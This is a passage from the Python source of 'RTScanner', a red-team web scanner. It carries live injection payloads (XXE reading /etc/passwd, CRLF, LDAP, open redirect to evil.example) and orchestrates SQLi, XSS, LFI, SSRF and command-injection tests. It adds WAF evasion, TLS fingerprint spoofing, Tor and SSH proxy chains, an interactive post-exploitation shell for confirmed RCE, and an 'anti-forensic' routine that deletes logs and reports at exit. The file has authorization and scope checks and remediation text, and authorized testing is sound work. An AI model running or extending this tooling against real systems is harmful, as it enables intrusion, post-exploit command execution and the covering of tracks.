async def test_open_redirect(client, url, param, findings, scope):
    payload = "https://evil.example/rtx"
    target = f"{url}?{urlencode({param: payload})}"
    if not is_in_scope(target, scope):
        return
    r = await client.get(target, follow_redirects=False)
    if r and r.status_code in (301, 302, 303, 307, 308):
        loc = r.headers.get("location", "")
        if "evil.example" in loc:
            _add(findings, Finding("Open Redirect", target, "Medium", 4.3,
                f"Param '{param}' controls redirect Location.",
                f"Location: {loc}", cwe_id="CWE-601",
                owasp_category="A01:2021",
                remediation="Allowlist redirect targets."))

async def test_crlf(client, url, param, findings, scope):
    payload = "%0d%0aRTX-Injected:%201"
    target = f"{url}?{urlencode({param: payload})}"
    if not is_in_scope(target, scope):
        return
    r = await client.get(target)
    if r and "rtx-injected" in (r.headers.get("rtx-injected", "") + str(r.headers)).lower():
        _add(findings, Finding("CRLF Injection (Response Splitting)", target,
            "High", 6.1,
            f"Param '{param}' injects CRLF into response headers.",
            "header RTX-Injected seen",
            cwe_id="CWE-113", owasp_category="A03:2021",
            remediation="Sanitize CR/LF from user input."))

async def test_ldap(client, url, param, findings, scope):
    payloads = ["*)(uid=*", "*)(|(uid=*))"]
    for p in payloads:
        target = f"{url}?{urlencode({param: p})}"
        if not is_in_scope(target, scope):
            continue
        r = await client.get(target)
        if r and any(x in r.text.lower() for x in
                     ["ldap", "invalid dn", "search filter"]):
            _add(findings, Finding("LDAP Injection", target, "High", 6.5,
                f"Param '{param}' LDAP injection signature.", f"payload={p}",
                cwe_id="CWE-90", owasp_category="A03:2021",
                remediation="Escape LDAP filter metacharacters; use safe SDK."))
            return

async def test_xxe(client, url, findings, scope):
    if not is_in_scope(url, scope):
        return
    payload = """<?xml version="1.0"?>
<!DOCTYPE rtx [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root>&x;</root>"""
    r = await client.post(url, content=payload,
                          headers={"Content-Type": "application/xml"})
    if r and ("root:x:" in r.text or "win.ini" in r.text):
        _add(findings, Finding("XXE (XML External Entity)", url, "Critical", 8.2,
            "XML parser processes external entities.",
            "file:///etc/passwd reflected",
            cwe_id="CWE-611", owasp_category="A05:2021",
            remediation="Disable external entity processing."))

async def test_graphql_introspection(client, url, findings, scope):
    gql = f"{url.rstrip('/')}/graphql"
    if not is_in_scope(gql, scope):
        return
    q = {"query": "{__schema{types{name}}}"}
    r = await client.post(gql, json=q)
    if r and r.status_code == 200 and "__schema" in r.text:
        _add(findings, Finding("GraphQL Introspection Enabled", gql, "Medium", 5.3,
            "Introspection query returns schema.", "types visible",
            cwe_id="CWE-200", owasp_category="A05:2021",
            remediation="Disable introspection in production."))

async def test_cors(client, url, findings, scope):
    if not is_in_scope(url, scope):
        return
    r = await client.get(url, headers={"Origin": "https://evil.example"})
    if r:
        acao = r.headers.get("access-control-allow-origin", "")
        acac = r.headers.get("access-control-allow-credentials", "").lower()
        if acao == "*" and acac == "true":
            _add(findings, Finding(
                "CORS Misconfiguration (Wildcard+Credentials)",
                url, "High", 7.1, "ACAO=* with credentials=true.",
                "ACAO=* + ACAC=true",
                cwe_id="CWE-942", owasp_category="A05:2021",
                remediation="Use explicit origin allowlist."))
        elif "evil.example" in acao:
            _add(findings, Finding("CORS Origin Reflection", url, "High", 6.5,
                "Server reflects arbitrary Origin.", f"ACAO={acao}",
                cwe_id="CWE-942", owasp_category="A05:2021",
                remediation="Validate Origin against allowlist."))

async def test_jwt(client, url, findings, scope):
    if not is_in_scope(url, scope):
        return
    r = await client.get(url)
    if not r:
        return
    cookies = r.cookies
    for cname in cookies:
        cval = cookies[cname]
        if cval.count(".") == 2 and cval.startswith("ey"):
            try:
                header_b64 = cval.split(".")[0] + "=="
                header = json.loads(base64.urlsafe_b64decode(header_b64))
                if header.get("alg", "").lower() == "none":
                    _add(findings, Finding("JWT 'none' Algorithm Accepted",
                        url, "Critical", 9.1,
                        f"Cookie {cname} uses alg=none.", "alg none",
                        cwe_id="CWE-347", owasp_category="A02:2021",
                        remediation="Reject 'none'; verify signature & alg allowlist."))
            except Exception:
                pass

async def discover_params(client, url) -> Set[str]:
    r = await client.get(url)
    params = set()
    if not r:
        return params
    soup = BeautifulSoup(r.text, "html.parser")
    for form in soup.find_all("form"):
        for inp in form.find_all(["input", "select", "textarea"]):
            if inp.get("name"):
                params.add(inp.get("name"))
    return params

# ==============================================================================
# ORCHESTRATION
# ==============================================================================
async def scan_parameters_async(client, base_url, findings, scope, oob,
                                evasion: EvasionEngine, verify_poc: bool,
                                param_list: Optional[List[str]] = None,
                                payload_db: Optional[Dict[str, List[str]]] = None,
                                state: Optional[ScanStateDB] = None,
                                plugin_mgr: Optional[PluginManager] = None,
                                shell_callback=None):
    discovered = await discover_params(client, base_url)
    params = list(set((param_list or []) + list(discovered)))
    if not params:
        params = ["id"]

    log.info(f"Testing {len(params)} params @ {base_url} (11 classes + plugins)...")
    tasks = []
    for p in params:
        if state and state.was_tested(base_url, p, "sqli"):
            continue
        cls_map = [
            ("sqli", test_sqli(client, base_url, p, findings, scope, evasion,
                               verify_poc, payload_db)),
            ("xss", test_xss(client, base_url, p, findings, scope, evasion)),
            ("lfi", test_lfi(client, base_url, p, findings, scope, evasion, verify_poc)),
            ("rfi", test_rfi(client, base_url, p, findings, scope, oob)),
            ("ssrf", test_ssrf(client, base_url, p, findings, scope, oob, verify_poc)),
            ("ssti", test_ssti(client, base_url, p, findings, scope, evasion)),
            ("cmdi", test_cmdi(client, base_url, p, findings, scope, oob,
                               evasion, verify_poc)),
            ("nosqli", test_nosqli(client, base_url, p, findings, scope)),
            ("redirect", test_open_redirect(client, base_url, p, findings, scope)),
            ("crlf", test_crlf(client, base_url, p, findings, scope)),
            ("ldap", test_ldap(client, base_url, p, findings, scope)),
        ]
        for cls_name, coro in cls_map:
            tasks.append(coro)
            if state:
                state.mark_tested(base_url, p, cls_name, "pending")

    await asyncio.gather(*tasks, return_exceptions=True)

    if plugin_mgr and plugin_mgr.plugins:
        await plugin_mgr.run_all(client, base_url, params, findings)

    if shell_callback:
        for f in findings:
            if f.severity in ("Critical", "High"):
                await shell_callback(f.vuln_type, f.endpoint, "id", f.severity)

async def crawl_async(client: AsyncClient, start_url, max_links, scope) -> Set[str]:
    log.info(f"Crawling (async, max {max_links})...")
    domain = urlparse(start_url).netloc
    visited, to_visit, structure = set(), [start_url], set()
    while to_visit and len(visited) < max_links:
        batch = to_visit[:10]
        to_visit = to_visit[10:]
        results = await asyncio.gather(*[client.get(u) for u in batch],
                                       return_exceptions=True)
        for u, r in zip(batch, results):
            if u in visited or not is_in_scope(u, scope or [domain]):
                continue
            visited.add(u)
            if not isinstance(r, httpx.Response) or r.status_code != 200:
                continue
            structure.add(u)
            try:
                soup = BeautifulSoup(r.text, "html.parser")
                for tag in soup.find_all(["a", "link", "script", "form"]):
                    link = tag.get("href") or tag.get("src") or tag.get("action")
                    if link:
                        full = urljoin(start_url, link)
                        if urlparse(full).netloc == domain and full not in visited:
                            to_visit.append(full)
            except Exception:
                continue
    log.info(f"Crawl complete: {len(structure)} URLs")
    return structure

# ==============================================================================
# [E] ANTI-FORENSIC CLEANUP
# ==============================================================================
ARTIFACT_PATTERNS = [
    "report_*", "cve_cache.json", "*.sarif", "*.log",
    "playwright-profile-*", ".rtscanner_*", "rtscanner_state.db",
]

def register_cleanup(patterns=None):
    patterns = patterns or ARTIFACT_PATTERNS
    def _clean():
        removed = []
        for pat in patterns:
            for p in glob.glob(pat):
                try:
                    if os.path.isdir(p):
                        shutil.rmtree(p, ignore_errors=True)
                    else:
                        os.remove(p)
                    removed.append(p)
                except OSError:
                    pass
        if removed:
            log.info(f"Anti-forensic: removed {len(removed)} artifacts")
    atexit.register(_clean)
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            signal.signal(sig, lambda *_a: (_clean(), sys.exit(130)))
        except Exception:
            pass
    return _clean

# ==============================================================================
# REPORTERS
# ==============================================================================
def build_html_report(r: ScanReport) -> str:
    sev_count = {k: 0 for k in SEVERITY_MAP}
    for f in r.findings:
        sev_count[f.severity] = sev_count.get(f.severity, 0) + 1
    rows = ""
    for f in sorted(r.findings, key=lambda x: -x.cvss_score):
        c = SEVERITY_MAP.get(f.severity, SEVERITY_MAP["Info"])
        rows += f"""<tr>
          <td style="background:{c['bg']};color:{c['color']};font-weight:bold">{f.severity}<br><small>CVSS {f.cvss_score}</small></td>
          <td><b>{f.vuln_type}</b><br><small>{f.cwe_id}</small></td>
          <td style="word-break:break-all"><code>{f.endpoint}</code></td>
          <td>{f.details}<br><small><i>{f.evidence}</i></small></td>
          <td style="font-size:12px">{f.remediation}</td>
        </tr>"""
    cves = "".join(
        f"<li><b>{c['id']}</b> (CVSS {c['score']}) — {c['tech']} {c['version']}: "
        f"{c['desc'][:120]}</li>"
        for c in r.cve_matches[:20]
    )
    structure = "".join(f"<li><code>{u}</code></li>" for u in r.structure[:200])
    return f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>RTScanner Report - {r.target}</title>
<style>
body{{font-family:'Segoe UI',Arial;background:#f4f7f6;margin:0;padding:20px;color:#2c3e50}}
.wrap{{max-width:1100px;margin:auto;background:#fff;padding:40px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.08)}}
h1{{border-bottom:3px solid #c0392b;padding-bottom:12px}}
h2{{color:#c0392b;margin-top:35px;border-left:5px solid #c0392b;padding-left:12px}}
.meta{{display:grid;grid-template-columns:1fr 1fr;gap:8px;background:#ecf0f1;padding:20px;border-radius:8px}}
.meta b{{color:#c0392b}}
.stats{{display:flex;gap:15px;flex-wrap:wrap;margin:20px 0}}
.stat{{flex:1;min-width:130px;padding:15px;border-radius:8px;text-align:center;color:#fff}}
.stat .n{{font-size:28px;font-weight:bold}}
table{{width:100%;border-collapse:collapse;margin-top:15px;font-size:14px}}
th{{background:#2c3e50;color:#fff;padding:12px;text-align:left}}
td{{padding:10px;border-bottom:1px solid #eee;vertical-align:top}}
.footer{{margin-top:40px;padding-top:20px;border-top:1px solid #ddd;font-size:12px;color:#7f8c8d}}
</style></head><body><div class="wrap">
<h1>Web Security Assessment Report</h1>
<div class="meta">
 <div><b>Target</b><br>{r.target}</div><div><b>Scan ID</b><br>{r.scan_id}</div>
 <div><b>Operator</b><br>{r.operator}</div><div><b>Auth Ref</b><br>{r.authorization_ref or 'N/A'}</div>
 <div><b>Start</b><br>{r.scan_start}</div><div><b>End</b><br>{r.scan_end}</div>
 <div><b>CMS</b><br>{r.cms_info.get('cms','?')}</div><div><b>Server</b><br>{r.cms_info.get('server','?')}</div>
 <div><b>WAF</b><br>{r.waf_detected}</div><div><b>Findings</b><br>{len(r.findings)}</div>
</div>
<h2>Executive Summary</h2>
<div class="stats">
 <div class="stat" style="background:#c0392b">Critical<div class="n">{sev_count['Critical']}</div></div>
 <div class="stat" style="background:#e67e22">High<div class="n">{sev_count['High']}</div></div>
 <div class="stat" style="background:#f39c12">Medium<div class="n">{sev_count['Medium']}</div></div>
 <div class="stat" style="background:#3498db">Low<div class="n">{sev_count['Low']}</div></div>
 <div class="stat" style="background:#95a5a6">Info<div class="n">{sev_count['Info']}</div></div>
</div>
{'<h2>CVE Matches</h2><ul>'+cves+'</ul>' if cves else ''}
<h2>Findings & Remediation</h2>
<table><tr><th>Severity</th><th>Vulnerability</th><th>Endpoint</th><th>Detail / Evidence</th><th>Remediation</th></tr>
{rows or '<tr><td colspan="5">No findings.</td></tr>'}</table>
<h2>Discovered Structure</h2>
<ul style="max-height:300px;overflow:auto">{structure or '<li>None</li>'}</ul>
<div class="footer"><b>⚠️ Confidential</b> — RTScanner v3.2.0 · {r.scan_end}</div>
</div></body></html>"""

def build_sarif(r: ScanReport) -> Dict[str, Any]:
    rules, results = {}, []
    for f in r.findings:
        rule_id = f.template_id or re.sub(r"\W+", "-", f.vuln_type).strip("-")
        if rule_id not in rules:
            rules[rule_id] = {
                "id": rule_id,
                "name": f.vuln_type,
                "shortDescription": {"text": f.vuln_type},
                "fullDescription": {"text": f.details},
                "help": {"text": f.remediation or "N/A"},
                "properties": {
                    "cwe": f.cwe_id, "owasp": f.owasp_category,
                    "cvss": f.cvss_score, "severity": f.severity,
                },
                "defaultConfiguration": {
                    "level": {"Critical": "error", "High": "error",
                              "Medium": "warning", "Low": "note",
                              "Info": "none"}[f.severity]
                }
            }
        results.append({
            "ruleId": rule_id,
            "level": {"Critical": "error", "High": "error", "Medium": "warning",
                      "Low": "note", "Info": "none"}[f.severity],
            "message": {"text": f"{f.details} — {f.evidence}"},
            "locations": [{
                "physicalLocation": {
                    "artifactLocation": {"uri": f.endpoint}
                }
            }],
            "properties": {
                "cvss": f.cvss_score, "severity": f.severity,
                "cwe": f.cwe_id, "owasp": f.owasp_category,
                "cve": f.cve_ids
            }
        })
    return {
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": {"driver": {
                "name": "RTScanner", "version": "3.2.0",
                "informationUri": "https://example.invalid/rtscanner",
                "rules": list(rules.values())
            }},
            "results": results,
            "properties": {
                "target": r.target, "scanId": r.scan_id,
                "operator": r.operator, "authRef": r.authorization_ref
            }
        }]
    }

def save_reports(r: ScanReport, formats: List[str]) -> List[str]:
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    domain = urlparse(r.target).netloc.replace(":", "_")
    base = f"report_{domain}_{ts}"
    paths = []
    if "json" in formats:
        p = f"{base}.json"
        json.dump(asdict(r), open(p, "w", encoding="utf-8"),
                  indent=2, ensure_ascii=False)
        paths.append(p)
    if "html" in formats:
        p = f"{base}.html"
        open(p, "w", encoding="utf-8").write(build_html_report(r))
        paths.append(p)
    if "sarif" in formats:
        p = f"{base}.sarif"
        json.dump(build_sarif(r), open(p, "w", encoding="utf-8"), indent=2)
        paths.append(p)
    return paths

# ==============================================================================
# MAIN SCAN ORCHESTRATION
# ==============================================================================
async def run_scan(args, report: ScanReport, scope: List[str],
                   chain: ProxyChain, jitter: Jitter,
                   evasion: EvasionEngine) -> List[Finding]:
    auth = AuthConfig(cookie=args.auth_cookie, bearer=args.auth_bearer,
                      basic=args.auth_basic, form_login=args.auth_form_url,
                      form_user=args.auth_user, form_pass=args.auth_pass,
                      user_field=args.auth_user_field,
                      pass_field=args.auth_pass_field)

    oob = None
    if args.oob_server:
        oob = OOBClient(server=args.oob_server, token=args.oob_token,
                        poll_timeout=args.oob_timeout,
                        poll_interval=args.oob_interval)
        log.info(f"OOB enabled: {args.oob_server} (domain {oob.domain})")

    # [1] State DB + resume
    state = None
    findings: List[Finding] = []
    if args.state_db or args.resume:
        db_path = args.state_db or "rtscanner_state.db"
        state = ScanStateDB(db_path, report.scan_id, report.target, vars(args))
        if args.resume:
            log.info(f"[Resume] Loading state from {db_path} "
                     f"({state.visited_count()} visited URLs)...")
            findings = state.load_findings()
            log.info(f"[Resume] Restored {len(findings)} findings")

    # [4] Wordlists & plugins
    param_list = WordlistLoader.load_params(args.param_wordlist)
    payload_db = WordlistLoader.load_payloads(args.payload_dir)
    if payload_db:
        log.info(f"[Wordlist] Payload kinds: {list(payload_db.keys())}")

    plugin_mgr = PluginManager(args.plugin_dir)
    plugin_mgr.load()

    # [5] Advanced evasion
    use_impersonate = bool(args.impersonate) and CURL_CFFI_OK
    if args.impersonate and not CURL_CFFI_OK:
        log.warning("--impersonate requires curl_cffi → pip install curl_cffi")

    # [3] Interactive shell handler
    shell_holder: Dict[str, Any] = {"shell": None}

    async def _maybe_shell(vuln_type, url, param, severity):
        if severity not in ("Critical", "High"):
            return
        if args.interactive_shell or args.os_cmd:
            shell_holder["shell"] = InteractiveShell(vuln_type, url, param, client_ref[0])

    client_ref: List[Any] = [None]

    try:
        # Impersonate pre-flight check (TLS fingerprint spoofed)
        if use_impersonate:
            proxy_for_imp = chain.for_httpx() if chain.is_active() else args.proxy
            async with ImpersonatingClient(
                impersonate=args.impersonate,
                proxy=proxy_for_imp,
                headers=auth.headers()
            ) as imp_client:
                r = await imp_client.get(report.target)
                if not r:
                    log.error("Target unreachable (impersonate mode).")
                    return findings
                log.info(f"[Evasion] Pre-flight OK with {args.impersonate}")

        async with AsyncClient(auth=auth, proxy=args.proxy, verify=False,
                               concurrency=args.concurrency, chain=chain,
                               jitter=jitter, waf_evasion=evasion) as client:
            client_ref[0] = client
            r = await client.get(report.target)
            if not r:
                log.error("Target unreachable (async). Aborting.")
                return findings

            # [2] Deep endpoint discovery
            discoverer = EndpointDiscoverer(client, report.target, state)
            disco = await discoverer.discover()

            structure = await crawl_async(client, report.target, args.max_links,
                                          scope or [urlparse(report.target).netloc])
            all_urls = structure | disco["sitemap"] | disco["js_endpoints"] | disco["robots"]
            report.structure = sorted(all_urls)[:500]

            swagger_urls = []
            for ep in disco["swagger"]:
                swagger_urls.append(ep["url"])
                if state:
                    state.mark_visited(ep["url"], 0, "")

            for f in discoverer.secrets_to_findings(disco["secrets"]):
                _add(findings, f)
                if state:
                    state.add_finding(f)

            log.info("Sensitive file checks...")
            await check_sensitive_files(client, report.target, findings, scope)

            log.info("CORS / GraphQL / XXE / JWT...")
            await asyncio.gather(
                test_cors(client, report.target, findings, scope),
                test_graphql_introspection(client, report.target, findings, scope),
                test_xxe(client, report.target, findings, scope),
                test_jwt(client, report.target, findings, scope),
                return_exceptions=True)

            # [1] Resume-aware parameter scan
            log.info(f"Parameter injection battery on {len(all_urls)} URLs...")
            base_urls = [report.target] + swagger_urls + list(all_urls)[:args.max_links]
            seen_base = set()
            for base_u in base_urls[:20]:
                if base_u in seen_base:
                    continue
                seen_base.add(base_u)
                if state and args.resume and state.is_visited(base_u):
                    log.debug(f"[Resume] Skip {base_u}")
                    continue
                await scan_parameters_async(
                    client, base_u, findings, scope, oob, evasion,
                    args.verify_poc, param_list=param_list,
                    payload_db=payload_db, state=state,
                    plugin_mgr=plugin_mgr, shell_callback=_maybe_shell)
                if state:
                    state.mark_visited(base_u, 200, "")

            # [5] HTTP/2 fingerprint probe
            if args.http2_spoof:
                log.info("[HTTP2] Probing server fingerprint...")
                spoof = Http2SpoofClient(profile="chrome")
                host = urlparse(report.target).hostname
                probe = await spoof.probe(host)
                if probe:
                    log.info(f"[HTTP2] Server settings: {probe['server_settings']}")
                    report.stats["http2_fingerprint"] = probe

            # Templates
            if args.templates:
                loader = TemplateLoader(args.templates)
                tpls = loader.load()
                if tpls:
                    log.info(f"Running {len(tpls)} custom templates...")
                    results = await asyncio.gather(*[
                        run_template(t, report.target, client, oob, scope)
                        for t in tpls
                    ], return_exceptions=True)
                    for x in results:
                        if isinstance(x, Finding):
                            _add(findings, x)
                            if state:
                                state.add_finding(x)

            # [3] Interactive shell OR single-shot os-cmd
            if shell_holder["shell"]:
                if args.os_cmd:
                    log.info(f"[PostExploit] Running --os-cmd: {args.os_cmd}")
                    out = await shell_holder["shell"].run_single(args.os_cmd)
                    print(f"\n[PostExploit Result]\n{out}\n")
                    report.stats["post_exploit_output"] = out[:2000]
                elif args.interactive_shell:
                    await shell_holder["shell"].interactive_loop()

    finally:
        if state:
            state.finish("completed")
            state.close()

    return findings

# ==============================================================================
# CLI
# ==============================================================================
def main():
    ap = argparse.ArgumentParser(
        description="RTScanner v3.2.0 — Elite Red Team Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="⚠️ Authorized use only.")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--authorized", action="store_true", help="(WAJIB)")
    ap.add_argument("--authorization-ref", default="")
    ap.add_argument("--scope", help="File of in-scope hosts/CIDR/regex (1/line)")
    ap.add_argument("--operator", default=os.getenv("USER", "anonymous"))
    ap.add_argument("--max-links", type=int, default=40)
    ap.add_argument("--delay", type=float, default=0.0)
    ap.add_argument("-v", "--verbose", action="store_true")

    # [A] Proxy / Tunneling
    ap.add_argument("--proxy", help="Single HTTP proxy (legacy)")
    ap.add_argument("--proxy-chain",
                    help="Chain: socks5://h:1080>http://h2:8080>tor")
    ap.add_argument("--ssh-tunnel", help="ssh://user:pass@host:22 (spawns SOCKS5)")

    # [B] Evasion
    ap.add_argument("--evade", action="store_true",
                    help="Enable WAF evasion (mutate payloads)")
    ap.add_argument("--evade-aggressive", action="store_true",
                    help="Aggressive mutators (comment, null-byte, overlong)")

    # [C] Smart session
    ap.add_argument("--no-browser", action="store_true",
                    help="Disable Playwright even if installed")
    ap.add_argument("--session-keepalive", type=int, default=300,
                    help="Seconds between session refresh checks")

    # [D] PoC
    ap.add_argument("--verify-poc", action="store_true",
                    help="Run safe PoC verification (reduces false positives)")

    # [E] Jitter / anti-forensic
    ap.add_argument("--jitter-base", type=float, default=0.3)
    ap.add_argument("--jitter-sigma", type=float, default=0.25)
    ap.add_argument("--jitter-max", type=float, default=5.0)
    ap.add_argument("--anti-forensic", action="store_true",
                    help="Auto-delete artifacts at exit")
    ap.add_argument("--keep-reports", action="store_true",
                    help="Exempt reports from --anti-forensic")

    # OOB / Templates / CVE / Auth / Output
    ap.add_argument("--oob-server", help="interactsh-style server URL")
    ap.add_argument("--oob-token", default="")
    ap.add_argument("--oob-timeout", type=int, default=15)
    ap.add_argument("--oob-interval", type=float, default=2.0)
    ap.add_argument("--templates", help="Directory of JSON templates")
    ap.add_argument("--concurrency", type=int, default=20)
    ap.add_argument("--cve-cache", default="cve_cache.json")
    ap.add_argument("--cve-live", action="store_true",
                    help="Query NVD API live (slow, rate-limited)")
    ap.add_argument("--auth-cookie", default="")
    ap.add_argument("--auth-bearer", default="")
    ap.add_argument("--auth-basic", default="", help="user:pass")
    ap.add_argument("--auth-form-url", default="")
    ap.add_argument("--auth-user", default="")
    ap.add_argument("--auth-pass", default="")
    ap.add_argument("--auth-user-field", default="username")
    ap.add_argument("--auth-pass-field", default="password")
    ap.add_argument("--format", default="html,json",
                    help="Comma-separated: html,json,sarif")

    # === v3.2.0 NEW ARGS ===
    # [1] State & resume
    ap.add_argument("--state-db", default="",
                    help="SQLite state DB path (enables persistence)")
    ap.add_argument("--resume", action="store_true",
                    help="Resume scan from --state-db")

    # [2] Deep discovery
    ap.add_argument("--js-scan", action="store_true", default=True,
                    help="Scan JS bundles for endpoints/secrets (default on)")

    # [3] Interactive shell
    ap.add_argument("--interactive-shell", action="store_true",
                    help="Drop into REPL after confirming RCE/SQLi/LFI")
    ap.add_argument("--os-cmd", default="",
                    help="Single command to run via confirmed RCE (safe)")

    # [4] Wordlist & plugins
    ap.add_argument("--param-wordlist",
                    help="File with custom param names (1/line)")
    ap.add_argument("--payload-dir",
                    help="Directory with sqli.txt, xss.txt, lfi.txt...")
    ap.add_argument("--plugin-dir",
                    help="Directory of Python plugin files")

    # [5] Advanced evasion
    ap.add_argument("--impersonate", default="",
                    choices=["", "chrome120", "chrome124", "firefox120",
                             "safari17_0", "edge101"],
                    help="curl_cffi TLS/JA3 impersonation profile")
    ap.add_argument("--http2-spoof", action="store_true",
                    help="Probe server HTTP/2 settings fingerprint")

    args = ap.parse_args()

    setup_logging(args.verbose)
    print(BANNER)

    if not validate_authorization(args):
        sys.exit(1)
    if not ASYNC_AVAILABLE:
        log.error("httpx required: pip install httpx")
        sys.exit(3)

    chain_spec = args.proxy_chain or args.ssh_tunnel or args.proxy
    chain = ProxyChain(chain_spec)
    if chain.is_active():
        log.info(f"Proxy chain: {chain.describe()}")

    jitter = Jitter(args.jitter_base, args.jitter_sigma, args.jitter_max)
    evasion = EvasionEngine(aggressive=args.evade_aggressive or args.evade)
    if args.evade or args.evade_aggressive:
        log.info(f"WAF evasion ON (aggressive={args.evade_aggressive})")

    if args.no_browser:
        global PW_OK
        PW_OK = False
        log.info("Playwright disabled by --no-browser")

    if args.anti_forensic:
        pats = list(ARTIFACT_PATTERNS)
        if args.keep_reports:
            pats = [p for p in pats if not p.startswith("report_")]
        register_cleanup(pats)
        log.info("Anti-forensic cleanup registered.")

    target = args.url if args.url.startswith("http") else "https://" + args.url
    scope = []
    if args.scope and os.path.exists(args.scope):
        scope = [ln.strip() for ln in open(args.scope) if ln.strip()]
        log.info(f"Scope: {scope}")

    scan_id = hashlib.sha256(f"{target}{time.time()}".encode()).hexdigest()[:16]
    report = ScanReport(target=target, scan_id=scan_id, operator=args.operator,
                        authorization_ref=args.authorization_ref,
                        scan_start=str(datetime.datetime.now()))

    # Sync recon
    client = StealthClient(delay_range=(0.0, args.delay + 0.2),
                           jitter=jitter, chain=chain)
    if not client.get(target):
        log.error("Target unreachable (sync). Aborting.")
        sys.exit(2)
    report.waf_detected = detect_waf_sync(client, target)
    report.cms_info = fingerprint_sync(client, target)
    log.info(f"CMS: {report.cms_info.get('cms')} | "
             f"Server: {report.cms_info.get('server')} | "
             f"WAF: {report.waf_detected}")

    # CVE correlation
    cve = CVELookup(cache_path=args.cve_cache, use_live=args.cve_live)
    report.cve_matches = correlate_cves(report.cms_info, cve)
    cve.save()
    if report.cve_matches:
        log.warning(f"CVE matches: {len(report.cve_matches)}")
        for m in report.cve_matches[:10]:
            log.warning(f"  {m['id']} (CVSS {m['score']}) — "
                        f"{m['tech']} {m['version']}")

    # Async scan
    findings = asyncio.run(run_scan(args, report, scope, chain, jitter, evasion))

    missing = report.cms_info.get("missing_security_headers", [])
    if missing:
        _add(findings, Finding("Missing Security Headers", target, "Low", 3.1,
            ", ".join(missing), cwe_id="CWE-16",
            owasp_category="A05:2021",
            remediation="Add OWASP-recommended headers."))

    report.findings = findings
    report.scan_end = str(datetime.datetime.now())
    report.stats = {k.lower(): sum(1 for f in findings if f.severity == k)
                    for k in SEVERITY_MAP}

    fmts = [x.strip() for x in args.format.split(",") if x.strip()]
    paths = save_reports(report, fmts)
    print("\n" + "=" * 70)
    print(f" SCAN COMPLETE — {len(findings)} findings | "
          f"{len(report.cve_matches)} CVE matches")
    for p in paths:
        print(f" Report: {p}")
    print("=" * 70)

if __name__ == "__main__":
    main()